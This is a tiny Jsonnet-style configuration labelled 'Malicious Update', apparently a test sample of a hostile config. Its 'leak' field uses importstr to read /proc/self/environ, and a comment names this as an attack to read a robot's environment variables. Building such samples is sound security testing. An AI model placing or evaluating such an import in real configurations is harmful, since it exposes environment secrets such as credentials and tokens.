{
  version: "1.0.1",
  status: "Malicious Update",
  // THE ATTACK: This attempts to read the robot's environment variables
  "leak": importstr "/proc/self/environ"
}
